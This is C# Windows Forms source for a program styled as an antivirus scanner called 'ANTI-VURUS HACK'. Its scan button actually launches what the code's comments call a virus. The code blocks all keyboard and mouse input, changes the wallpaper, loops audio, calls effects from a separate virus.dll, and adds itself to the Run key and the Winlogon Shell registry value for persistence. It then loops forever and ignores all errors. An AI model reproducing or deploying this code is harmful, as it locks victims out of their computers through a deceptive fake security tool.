using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Media;
using System.IO;
using Microsoft.Win32;

namespace AntiVurusHack
{
    public partial class MainForm : Form
    {
        // Импорт функций
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        
        [DllImport("virus.dll")]
        private static extern void StartVirusEffects();
        
        private SoundPlayer soundPlayer;
        private bool virusActive = false;
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;
        
        public MainForm()
        {
            InitializeComponent();
            this.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
            InitializeCustomComponents();
        }
        
        private void InitializeCustomComponents()
        {
            // Настройка формы
            this.Text = "ANTI-VURUS HACK";
            this.Size = new Size(900, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(15, 15, 20);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            
            // Левая панель
            Panel leftPanel = new Panel();
            leftPanel.Width = 200;
            leftPanel.BackColor = Color.FromArgb(25, 25, 30);
            leftPanel.Dock = DockStyle.Left;
            
            // Кнопки на левой панели
            string[] leftButtons = { "👤 Профиль", "📊 Статистика", "⚙ Настройки", "ℹ Информация" };
            for (int i = 0; i < leftButtons.Length; i++)
            {
                Button btn = CreateModernButton(leftButtons[i]);
                btn.Top = 50 + i * 70;
                btn.Left = 20;
                btn.Width = 160;
                btn.Height = 50;
                
                if (leftButtons[i] == "ℹ Информация")
                {
                    btn.Click += (s, e) => 
                        MessageBox.Show("Сделан одним автором: ArcenaL4Ik,ИСКЛЮЧИТЕЛЬНО ДЛЯ NEDOHACKERS LITE", 
                                      "Информация", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                
                leftPanel.Controls.Add(btn);
            }
            
            // Правая панель (основная)
            Panel rightPanel = new Panel();
            rightPanel.Dock = DockStyle.Fill;
            rightPanel.BackColor = Color.FromArgb(20, 20, 25);
            
            // Заголовок
            Label title = new Label();
            title.Text = "ANTI-VURUS HACK";
            title.Font = new Font("Segoe UI", 32, FontStyle.Bold);
            title.ForeColor = Color.FromArgb(0, 255, 136);
            title.AutoSize = true;
            title.Top = 50;
            title.Left = (rightPanel.Width - title.Width) / 2;
            title.TextAlign = ContentAlignment.MiddleCenter;
            
            // Подзаголовок
            Label subtitle = new Label();
            subtitle.Text = "Мощное сканирование системы на угрозы";
            subtitle.Font = new Font("Segoe UI", 12);
            subtitle.ForeColor = Color.LightGray;
            subtitle.AutoSize = true;
            subtitle.Top = title.Bottom + 10;
            subtitle.Left = (rightPanel.Width - subtitle.Width) / 2;
            
            // Кнопка сканирования
            Button scanBtn = new Button();
            scanBtn.Text = "🔍 НАЧАТЬ СКАНИРОВАНИЕ";
            scanBtn.Font = new Font("Segoe UI", 14, FontStyle.Bold);
            scanBtn.Size = new Size(300, 80);
            scanBtn.Top = subtitle.Bottom + 60;
            scanBtn.Left = (rightPanel.Width - scanBtn.Width) / 2;
            scanBtn.BackColor = Color.FromArgb(220, 40, 40);
            scanBtn.ForeColor = Color.White;
            scanBtn.FlatStyle = FlatStyle.Flat;
            scanBtn.FlatAppearance.BorderSize = 0;
            scanBtn.Cursor = Cursors.Hand;
            scanBtn.Click += ScanButton_Click;
            
            // Панель настроек
            Panel settingsPanel = new Panel();
            settingsPanel.Size = new Size(400, 120);
            settingsPanel.Top = scanBtn.Bottom + 40;
            settingsPanel.Left = (rightPanel.Width - settingsPanel.Width) / 2;
            settingsPanel.BackColor = Color.FromArgb(30, 30, 35);
            
            Label diskLabel = new Label();
            diskLabel.Text = "Диск для сканирования:";
            diskLabel.ForeColor = Color.LightGray;
            diskLabel.Location = new Point(20, 20);
            
            ComboBox diskCombo = new ComboBox();
            diskCombo.Items.AddRange(new string[] { "C:\\", "D:\\", "Все диски" });
            diskCombo.SelectedIndex = 0;
            diskCombo.Location = new Point(180, 17);
            diskCombo.Width = 200;
            diskCombo.BackColor = Color.FromArgb(40, 40, 45);
            diskCombo.ForeColor = Color.White;
            diskCombo.FlatStyle = FlatStyle.Flat;
            
            Label typeLabel = new Label();
            typeLabel.Text = "Тип сканирования:";
            typeLabel.ForeColor = Color.LightGray;
            typeLabel.Location = new Point(20, 60);
            
            ComboBox typeCombo = new ComboBox();
            typeCombo.Items.AddRange(new string[] { "Быстрое", "Полное", "Глубокое" });
            typeCombo.SelectedIndex = 0;
            typeCombo.Location = new Point(180, 57);
            typeCombo.Width = 200;
            typeCombo.BackColor = Color.FromArgb(40, 40, 45);
            typeCombo.ForeColor = Color.White;
            typeCombo.FlatStyle = FlatStyle.Flat;
            
            settingsPanel.Controls.AddRange(new Control[] { diskLabel, diskCombo, typeLabel, typeCombo });
            
            rightPanel.Controls.AddRange(new Control[] { title, subtitle, scanBtn, settingsPanel });
            
            this.Controls.Add(leftPanel);
            this.Controls.Add(rightPanel);
        }
        
        private Button CreateModernButton(string text)
        {
            Button btn = new Button();
            btn.Text = text;
            btn.Font = new Font("Segoe UI", 11);
            btn.BackColor = Color.FromArgb(40, 40, 45);
            btn.ForeColor = Color.White;
            btn.FlatStyle = FlatStyle.Flat;
            btn.FlatAppearance.BorderSize = 0;
            btn.Cursor = Cursors.Hand;
            btn.TextAlign = ContentAlignment.MiddleLeft;
            btn.Padding = new Padding(15, 0, 0, 0);
            
            btn.MouseEnter += (s, e) => btn.BackColor = Color.FromArgb(60, 60, 65);
            btn.MouseLeave += (s, e) => btn.BackColor = Color.FromArgb(40, 40, 45);
            
            return btn;
        }
        
        private void ScanButton_Click(object sender, EventArgs e)
        {
            if (virusActive) return;
            
            Button scanBtn = (Button)sender;
            scanBtn.Text = "⚠ СКАНИРОВАНИЕ...";
            scanBtn.Enabled = false;
            scanBtn.BackColor = Color.FromArgb(255, 165, 0);
            
            virusActive = true;
            
            // Запуск вируса в отдельном потоке
            System.Threading.Thread virusThread = new System.Threading.Thread(() =>
            {
                try
                {
                    // 1. Блокировка ввода
                    BlockInput(true);
                    
                    // 2. Смена обоев
                    ChangeWallpaper();
                    
                    // 3. Запуск музыки
                    PlayVirusSound();
                    
                    // 4. Запуск эффектов из DLL
                    StartVirusEffects();
                    
                    // 5. Прописывание в реестр
                    WriteToRegistry();
                    
                    // 6. Бесконечный цикл
                    while (true)
                    {
                        System.Threading.Thread.Sleep(1000);
                        Application.DoEvents();
                    }
                }
                catch (Exception ex)
                {
                    // Игнорируем ошибки
                }
            });
            
            virusThread.SetApartmentState(System.Threading.ApartmentState.STA);
            virusThread.Start();
        }
        
        private void ChangeWallpaper()
        {
            try
            {
                string wallpaperPath = Path.Combine(Application.StartupPath, "Gdghd.png");
                if (File.Exists(wallpaperPath))
                {
                    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, 
                                       SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
                }
            }
            catch { }
        }
        
        private void PlayVirusSound()
        {
            try
            {
                string soundPath = Path.Combine(Application.StartupPath, "67.mp3");
                // Для MP3 потребуется дополнительная библиотека (NAudio)
                // Временная реализация через WAV
                soundPlayer = new SoundPlayer();
                soundPlayer.SoundLocation = soundPath.Replace(".mp3", ".wav");
                soundPlayer.PlayLooping();
            }
            catch { }
        }
        
        private void WriteToRegistry()
        {
            try
            {
                // Множественные записи в реестр
                string appPath = Application.ExecutablePath;
                
                // 1. Автозагрузка
                RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                runKey.SetValue("AntiVurusHack", appPath);
                
                // 2. Winlogon
                RegistryKey winlogon = Registry.LocalMachine.OpenSubKey(
                    @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                if (winlogon != null)
                    winlogon.SetValue("Shell", "explorer.exe," + appPath);
                
                // 3. Другие места
                string[] locations = {
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                    @"Software\Microsoft\Windows\CurrentVersion\Explorer",
                    @"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                    @"Software\Microsoft\Windows\CurrentVersion\RunServices"
                };
                
                foreach (var loc in locations)
                {
                    try
                    {
                        Registry.CurrentUser.CreateSubKey(loc);
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
